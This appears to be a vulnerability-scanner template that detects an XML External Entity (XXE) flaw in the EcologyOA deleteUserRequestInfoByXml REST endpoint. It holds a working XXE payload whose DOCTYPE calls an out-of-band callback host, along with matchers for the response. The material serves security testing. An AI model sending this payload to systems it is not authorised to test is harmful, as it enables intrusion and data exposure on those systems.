id: ecology-oa-byxml-xxe
brief:
    title: EcologyOA deleteUserRequestInfoByXml - XML External Entity Injection
    by: SleepingBag945
    level: high
    about: EcologyOA deleteUserRequestInfoByXml interface has XXE
    label:
        - ecology-oa
        - xxe
        - vuln
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/rest/ofs/deleteUserRequestInfoByXml'
      head:
        Accept-Encoding: gzip
        Content-Type: application/xml
      body: |-
        <?xml version="1.0" encoding="utf-8"?>
        <!DOCTYPE syscode SYSTEM "http://{{interactsh-url}}">
        <M><syscode>&send;</syscode></M>
      signs:
        - "on": word
          has:
            - WfData
          in: body
          need: all
        - "on": word
          has:
            - application/xml
          in: header
          need: all
        - "on": word
          has:
            - dns
          in: interactsh_protocol
          need: all
